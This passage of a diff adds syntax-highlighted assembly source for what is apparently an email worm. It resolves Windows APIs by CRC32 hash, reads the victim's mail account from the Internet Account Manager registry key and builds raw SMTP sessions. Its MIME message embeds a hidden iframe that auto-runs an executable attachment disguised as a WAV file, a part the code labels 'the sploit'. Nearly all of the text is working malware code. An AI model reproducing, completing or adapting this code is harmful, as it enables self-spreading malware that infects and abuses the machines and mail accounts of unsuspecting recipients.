+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                               
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc0">
+                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">foerroropening</span><span class="sc0">
+                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.createhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
+        
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                                     </span><span class="sc1">;max size low</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;handle</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.maphandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;handle</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">MapViewOfFile</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.viewhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">clc</span><span class="sc0">
+                </span><span class="sc6">ret</span><span class="sc0">
+</span><span class="sc5">foerroropening</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stc</span><span class="sc0">
+                </span><span class="sc6">ret</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+                </span><span class="sc1">;       ebx=module base/handle</span><span class="sc0">
+                </span><span class="sc1">;       edi=where to store</span><span class="sc0">
+                </span><span class="sc1">;       esi=crc32 stuff</span><span class="sc0">
+</span><span class="sc5">i_importapis</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;pointer to PE</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;export section</span><span class="sc0">
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
+
+</span><span class="sc5">i_ia_nextone</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">lodsd</span><span class="sc0">
+                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">i_ia_done</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;ecx=desired crc32</span><span class="sc0">
+
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;addresses of ApiNames</span><span class="sc0">
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
+</span><span class="sc5">i_ia_find</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">;address</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;add base</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;save base for later</span><span class="sc0">
+                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">v_crc32</span><span class="sc0">
+                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;actual crc32=desired?</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">i_ia_find</span><span class="sc0">                       </span><span class="sc1">;nope.. then next</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;preserve edx</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;eax=name</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+</span><span class="sc1">;                call    GetProcAddress</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">2038h</span><span class="sc4">]</span><span class="sc0">
+
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
+
+                </span><span class="sc6">stosd</span><span class="sc0">
+
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">i_ia_nextone</span><span class="sc0">
+</span><span class="sc5">i_ia_done</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">ret</span><span class="sc0">
+
+</span><span class="sc5">v_crc32</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;ofcourse i stole this... :)</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">09C3B248Eh</span><span class="sc0">
+    </span><span class="sc5">__gCRC32_next_byte</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">lodsb</span><span class="sc0">
+        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;end of name ?</span><span class="sc0">
+        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gCRC32_finish</span><span class="sc0">
+
+        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
+    </span><span class="sc5">__gCRC32_next_bit</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
+        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__gCRC32_no_change</span><span class="sc0">
+                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0C1A7F39Ah</span><span class="sc0">
+    </span><span class="sc5">__gCRC32_no_change</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
+        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__gCRC32_next_bit</span><span class="sc0">
+        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__gCRC32_next_byte</span><span class="sc0">
+    </span><span class="sc5">__gCRC32_finish</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;CRC32 to EAX</span><span class="sc0">
+        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
+        </span><span class="sc6">ret</span><span class="sc0">
+
+
+
+
+</span><span class="sc5">szRegAccountInfo</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Software\Microsoft\Internet Account Manager\Accounts\00000001"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+
+</span><span class="sc5">mCheck</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;recv/checkfor</span><span class="sc0">
+</span><span class="sc5">mFromAd</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">;mailfrom addy</span><span class="sc0">
+</span><span class="sc5">mDestAd</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;sendto addy</span><span class="sc0">
+</span><span class="sc5">mTime</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;right time/date field</span><span class="sc0">
+</span><span class="sc5">mSubj</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">;random generated subject</span><span class="sc0">
+</span><span class="sc5">mBase64</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">;base64 data</span><span class="sc0">
+</span><span class="sc5">mEom</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">            </span><span class="sc1">;endofmail</span><span class="sc0">
+
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc1">;       ***             the email data                  ***                  ;</span><span class="sc0">
+
+
+</span><span class="sc1">;                       smtp commands</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc5">crlf</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc5">crlfz</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">maildata</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">mCheck</span><span class="sc4">,</span><span class="sc12">'22'</span><span class="sc0">                     </span><span class="sc1">;--check 220 greet</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'HELO localhost'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">           </span><span class="sc1">;HELO localhost</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">mCheck</span><span class="sc4">,</span><span class="sc12">'25'</span><span class="sc0">                     </span><span class="sc1">;--check 250</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MAIL FROM: '</span><span class="sc4">,</span><span class="sc5">mFromAd</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">      </span><span class="sc1">;MAIL FROM: addie</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">mCheck</span><span class="sc4">,</span><span class="sc12">'25'</span><span class="sc0">                     </span><span class="sc1">;--check 250</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RCPT TO: '</span><span class="sc4">,</span><span class="sc5">mDestAd</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">        </span><span class="sc1">;RCPT TO: addie</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">mCheck</span><span class="sc4">,</span><span class="sc12">'25'</span><span class="sc0">                     </span><span class="sc1">;--check 250</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DATA'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">                     </span><span class="sc1">;DATA</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">mCheck</span><span class="sc4">,</span><span class="sc12">'35'</span><span class="sc0">                     </span><span class="sc1">;--check 354</span><span class="sc0">
+
+</span><span class="sc1">;                       stupid default stuph</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'From: '</span><span class="sc4">,</span><span class="sc5">mFromAd</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'To: '</span><span class="sc4">,</span><span class="sc5">mDestAd</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Subject: '</span><span class="sc4">,</span><span class="sc5">mSubj</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Date: '</span><span class="sc4">,</span><span class="sc5">mTime</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+
+                        </span><span class="sc1">;mime headers</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MIME-Version: 1.0'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: multipart/mixed;'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'        boundary="bound"'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'        X-Priority: 3'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'        X-MSMail-Priority: Normal'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'        X-Mailer: Microsoft Outlook Express 5.50.4522.1300'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'        X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1300'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'This is a multi-part message in MIME format.'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc0">
+
+                        </span><span class="sc1">;first part: html code to run the sploit</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'--bound'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: text/html;'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'        charset="iso-8859-1"'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Transfer-Encoding: quoted-printable'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&lt;HTML&gt;&lt;HEAD&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;iframe src=3Dcid:SOMECID height=3D0 width=3D0&gt;&lt;/iframe&gt;'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&lt;font&gt;peace&lt;/font&gt;&lt;/BODY&gt;&lt;/HTML&gt;'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc0">
+
+                        </span><span class="sc1">;next part - the sploit</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'--bound'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: audio/x-wav;'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'        name="whatever.exe"'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Transfer-Encoding: base64'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-ID: &lt;SOMECID&gt;'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc0">
+
+                        </span><span class="sc1">;base64 stuff</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">mBase64</span><span class="sc0">
+
+                        </span><span class="sc1">;end boundary &amp; quit command</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+                
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc4">,</span><span class="sc12">'--bound--'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'QUIT'</span><span class="sc4">,</span><span class="sc5">crlf</span><span class="sc4">,</span><span class="sc5">mEom</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc5">apicrcs</span><span class="sc4">:</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CloseHandle</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">ExitProcess</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GlobalAlloc</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetModuleHandleA</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GlobalFree</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetDateFormatA</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetTimeFormatA</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">Sleep</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">GetTickCount</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateFileA</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">CreateFileMappingA</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">MapViewOfFile</span><span class="sc4">&gt;</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
+
+        </span><span class="sc9">db</span><span class="sc0">              </span><span class="sc2">9</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">              </span><span class="sc3">"ADVAPI32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">RegCreateKeyA</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">RegQueryValueExA</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">RegCloseKey</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
+
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WSOCK32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">WSAStartup</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">socket</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">htons</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">gethostbyname</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">connect</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">closesocket</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">recv</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">send</span><span class="sc4">&gt;</span><span class="sc0">
+</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">WSACleanup</span><span class="sc4">&gt;</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
+
+
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"END"</span><span class="sc0">
+
+</span><span class="sc5">apis</span><span class="sc4">:</span><span class="sc0">
+
+</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">CloseHandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">ExitProcess</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">GlobalAlloc</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">GetModuleHandleA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">GlobalFree</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">GetDateFormatA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">GetTimeFormatA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">Sleep</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">GetTickCount</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">CreateFileA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">CreateFileMappingA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">MapViewOfFile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+
+
+</span><span class="sc5">RegCreateKeyA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+
+</span><span class="sc5">RegQueryValueExA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">RegCloseKey</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+
+
+</span><span class="sc5">WSAStartup</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">socket</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">htons</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">gethostbyname</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
